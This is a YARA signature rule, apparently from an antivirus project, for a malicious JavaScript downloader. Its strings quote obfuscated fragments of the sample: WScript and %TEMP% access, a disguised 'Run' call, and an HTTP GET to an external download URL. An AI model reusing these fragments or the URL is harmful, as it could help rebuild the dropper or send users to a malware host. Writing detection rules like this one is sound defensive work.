rule sig_20160428_b5c2126d5dde41c36d7e01d59ae240c1 {
  meta:
    description = "datamaliciousorder - file 20160428_b5c2126d5dde41c36d7e01d59ae240c1.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "1c65d6a49e2a25a3caccc51e0d8c31e27158402d706cb754076a54d622d24aa5"

  strings:
    $s1  = "function JanIyqHiwPmzFzqRdiTqr() {return RedNooVbaDqvAtkZofKpi[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s2  = "function KqkFdyAfyBauKokKmkAzn(HqxEhuTjtJydVtzFnkIyv, BciXyqLwrMdfAuiKbqIqh){NkdNukVwgQptNhhQkbEqn = NkdNukVwgQptNhhQkbEqn * 1; " ascii
    $s3  = "var RedNooVbaDqvAtkZofKpi = function HvlNliXknSuyNlwGluZvx() {return WgwGedWmbEupJldLglDgk[DfxTsqJayDeuYqhJsmZqu](\"WScript\"+\"" ascii
    $s4  = "return HqxEhuTjtJydVtzFnkIyv - BciXyqLwrMdfAuiKbqIqh;};" fullword ascii
    $s5  = "var RedNooVbaDqvAtkZofKpi = function HvlNliXknSuyNlwGluZvx() {return WgwGedWmbEupJldLglDgk[DfxTsqJayDeuYqhJsmZqu](\"WScript\"+\"" ascii
    $s6  = "var WgwGedWmbEupJldLglDgk = this[\"WScript\"];" fullword ascii
    $s7  = "function KfbOpgHziHqeBfkRibBeg(AjlLxjEkjCacNrbAolAyi){RedNooVbaDqvAtkZofKpi[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s8  = "function JanIyqHiwPmzFzqRdiTqr() {return RedNooVbaDqvAtkZofKpi[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s9  = "function KfbOpgHziHqeBfkRibBeg(AjlLxjEkjCacNrbAolAyi){RedNooVbaDqvAtkZofKpi[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s10 = "function UrrYlgKchKelAybHhjCrh(){return NmrJywYxaSziPsiCdbDki + \"\";};" fullword ascii
    $s11 = "function KqkFdyAfyBauKokKmkAzn(HqxEhuTjtJydVtzFnkIyv, BciXyqLwrMdfAuiKbqIqh){NkdNukVwgQptNhhQkbEqn = NkdNukVwgQptNhhQkbEqn * 1; " ascii
    $s12 = "if (XezQjcEhlHhrShbPdaEox[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s13 = "function KjlKysGqmFwjHduUczLws() {return ((DdsPqlCwcKwfFzmQpcCdd == true) && (DdsPqlCwcKwfFzmQpcCdd == HmmPeqVgvStmJcmLrhWdf)) ?" ascii
    $s14 = "function KjlKysGqmFwjHduUczLws() {return ((DdsPqlCwcKwfFzmQpcCdd == true) && (DdsPqlCwcKwfFzmQpcCdd == HmmPeqVgvStmJcmLrhWdf)) ?" ascii
    $s15 = "XezQjcEhlHhrShbPdaEox[CapSxdUhnSgsXzhJvaCqe](\"G\" + \"ET\", \"http://tribalsnedkeren.dk/n4jca\", false);" fullword ascii
    $s16 = "}while (EuzPblUfrSgaZiuDzcGam);" fullword ascii
    $s17 = "var HmmPeqVgvStmJcmLrhWdf = false;" fullword ascii
    $s18 = "function SdeNkiQwdBkhOyxFlcZfl(){return DfxTsqJayDeuYqhJsmZqu;};" fullword ascii
    $s19 = "var OeoQitLviMheKrdKloTpt = new this[\"D\"+\"ate\"]();" fullword ascii
    $s20 = "function RscIdcOosZljHclGpjOqu(DhvLgqAthXumVzsRaaFaf) {var EacLnbDxgGcwFgwFbpMwu = (1, 2, 3, 4, 5, DhvLgqAthXumVzsRaaFaf); retur" ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}